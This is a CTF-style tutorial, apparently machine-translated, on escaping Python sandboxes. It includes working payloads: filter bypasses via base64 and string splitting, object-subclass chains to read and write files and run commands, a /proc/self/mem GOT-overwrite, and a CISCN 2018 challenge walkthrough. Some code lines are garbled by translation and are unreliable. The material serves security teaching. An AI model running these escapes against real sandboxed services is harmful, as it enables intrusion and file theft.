[EN](./python-sandbox-escape.md) | [ZH](./python-sandbox-escape-zh.md)
---

typora-root-url: ../../../docs

---



# Python sandbox
The so-called Python sandbox, in a certain way to simulate the Python terminal, to achieve user use of Python.


# Python Sandbox Escape Some Ways
What we usually call Python sandbox escaping is to bypass the simulated Python terminal and ultimately implement command execution.
## Import module
In Python&#39;s built-in functions, there are some functions that help us implement arbitrary command execution:
```

os.system () os.popen ()
commands.getstatusoutput() commands.getoutput()

commands.getstatus()

subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)

pty.spawn()

```

There are usually three ways to import modules in Python (xxx is the module name):


1. `import xxx`

2. `from xxx import *`

3. `__import__('xxx')`



We can import the relevant modules through the above import method and use the above functions to implement the command execution.
In addition to this, we can also ** import modules via path**:
For example, in Linux system, the path of Python&#39;s os module is generally in `/usr/lib/python2.7/os.py`. When you know the path, we can import the module by the following operations, and then further use the relevant function.
```py

>>> import sys

>>> sys.modules['os']='/usr/lib/python2.7/os.py'

&gt;&gt;&gt; import the
>>>

```

**Other dangerous function examples**
Such as **execfile** file execution
```py

>>> execfile('/usr/lib/python2.7/os.py')

>>> system('cat /etc/passwd')

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

...

>>> getcwd()

'/usr/lib/python2.7'

```

** ** timeit
```py

import timeit

timeit.timeit("__import__('os').system('dir')",number=1)

```



** exec and eval are more classic **
```py

eval('__import__("os").system("dir")')



```

**platform**

```py

import platform

print platform.popen('dir').read()

```



However, the normal Python sandbox will blacklist the use of modules such as os or whitelists that only allow users to use the sandbox-provided modules to prevent dangerous operations. How to further escape the sandbox is our key research content.


## Python&#39;s built-in functions
When we can&#39;t import modules, or the modules we want to import are banned, then we can only look for Python&#39;s own built-in functions (that is, functions that are usually imported without default, and Python itself has been imported by default). We can get a list of built-in functions by using `dir __builtin__`
```python

&gt;&gt;&gt; say (__ builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']

```

In Python, built-in functions that do not introduce direct use are called **builtin** functions, and are automatically introduced into the environment with the **_builtin__** module. So how do we introduce the module? We can introduce the modules we want to introduce by **__dict__**. The role of **__dict__** is to list all the properties and functions below a module/class/object. This is useful in sandbox escapes, you can find some things hidden in it.
**__dict__**What can I do?
We know that a module object has a namespace implemented by a dictionary object, and a reference to the property is converted to a lookup in the dictionary. For example, mx is equivalent to m.dict[&quot;x&quot;].


Bypass the instance:
First pass the base64 bypass character plaintext detection
```python

>>> import base64

>>> base64.b64encode('__import__')

'X19pbXBvcnRfXw=='

&gt;&gt;&gt; base64.b64encode (&#39;os&#39;)
&#39;b3M =&#39;
```

Then quoted by **__dict__**
```py

>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))

```



* If some introverted functions are removed in __builtins__, we can reload them by reload(__builtins__) to get a complete __builtins__*
## Creating objects and references
There are a lot of basic functions integrated in Python&#39;s object class, and we can also refer to it by creating objects when we want to call them.


We have two common methods:
```bash

().__class__.__bases__[0]

''.__class__.__mro__[2]

```

![](http://oayoilchh.bkt.clouddn.com/18-5-3/14928461.jpg)

For example, we can pass
`print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()` achieves the effect of file reading,


**Common payload**
```py

#读文件
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()



#Write file
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')



#Execute arbitrary commands
() .__ class __.__ bases __ [0] .__ subclasses __ () [59] .__ init __. func_globals.values () [13] [&#39;eval&#39;] (&#39;__ import __ (&quot;os&quot;). popen (&quot;ls / var / www / html &quot;). read () &#39;)
```



## Indirect reference
In some topics, such as the Python sandbox issue of the 2018 National Tournament, the import is actually castrated. But in Python, the native **__import__** is referenced, as long as we find the relevant object reference, we can further get what we want, the following demo will tell you


## writeModify got table
Is actually a memory operation method of **/proc/self/mem**
**/proc/self/mem** is a memory image that can be used to read and write all the memory of the process, including executable code. If we can get the offset of some functions of Python, such as **system**, We can then override the purpose of getshell by overriding the got.
```py

(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))

```

The first address is the offset of system, the second is the offset of fopen, we can get the relevant information through **objdump**
![](http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg)



#example2018 ciscn Python sandbox escape in the National University Information Security Competition.
We can get the title source by `print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read()`, and then we can further analyze it. An escape method.
### Creating objects and using Python to manipulate string characteristics
```py

x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__

x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')

x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')

x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')

```

### Hijack got table getshell
```py

(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))





(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))



```

### Looking for an indirect reference to __import__
In the continuous dir process, I found that __closure__ this object saves the parameters, you can refer to the native __import__
```py



print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 

```

# 参考
https://xz.aliyun.com/t/52#toc-10 

https://blog.csdn.net/qq_35078631/article/details/78504415 

https://www.anquanke.com/post/id/85571 

http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01
